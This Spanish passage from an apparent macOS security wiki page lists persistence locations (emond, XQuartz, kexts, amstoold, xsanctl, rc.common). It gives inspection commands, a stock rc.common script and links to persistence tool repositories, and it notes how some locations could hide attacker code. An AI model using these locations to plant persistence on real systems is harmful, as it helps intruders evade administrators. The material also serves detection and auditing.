Introducido por Apple, **emond** es un mecanismo de registro que parece estar poco desarrollado o posiblemente abandonado, aunque sigue siendo accesible. Aunque no resulta especialmente útil para un administrador de Mac, este servicio poco conocido podría utilizarse como un método de persistencia discreto para threat actors, probablemente sin ser detectado por la mayoría de los administradores de macOS.

Para quienes conocen su existencia, identificar cualquier uso malicioso de **emond** es sencillo. El LaunchDaemon del sistema para este servicio busca scripts que ejecutar en un único directorio. Para inspeccionarlo, se puede utilizar el siguiente comando:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Informe: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Ubicación

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Se requiere root
- **Trigger**: Con XQuartz

#### Descripción y exploit

XQuartz **ya no está instalado en macOS**, así que si quieres más información, consulta el informe.

### ~~kext~~

> [!CAUTION]
> Es tan complicado instalar un kext incluso como root que no lo consideraré una forma de escapar de sandboxes ni siquiera para la persistencia (a menos que tengas un exploit)

#### Ubicación

Para instalar un KEXT como elemento de inicio, debe estar **instalado en una de las siguientes ubicaciones**:

- `/System/Library/Extensions`
- Archivos KEXT integrados en el sistema operativo OS X.
- `/Library/Extensions`
- Archivos KEXT instalados por software de terceros

Puedes listar los archivos kext cargados actualmente con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Para obtener más información sobre [**kernel extensions consulta esta sección**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Ubicación

- **`/usr/local/bin/amstoold`**
- Se requiere Root

#### Descripción y explotación

Aparentemente, el `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilizaba este binario mientras exponía un servicio XPC... el problema es que el binario no existía, por lo que podías colocar algo allí y, cuando se llamara al servicio XPC, se ejecutaría tu binario.

Ya no puedo encontrar esto en mi macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Ubicación

- **`/Library/Preferences/Xsan/.xsanrc`**
- Se requiere Root
- **Trigger**: Cuando se ejecuta el servicio (pocas veces)

#### Descripción y explotación

Aparentemente, no es muy común ejecutar este script y ni siquiera pude encontrarlo en mi macOS, así que, si quieres más información, consulta el writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Esto no funciona en versiones modernas de MacOS**

También es posible colocar aquí **comandos que se ejecutarán durante el inicio.** Ejemplo de script rc.common normal:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas y herramientas de persistencia

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referencias

- [2025, el año del Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
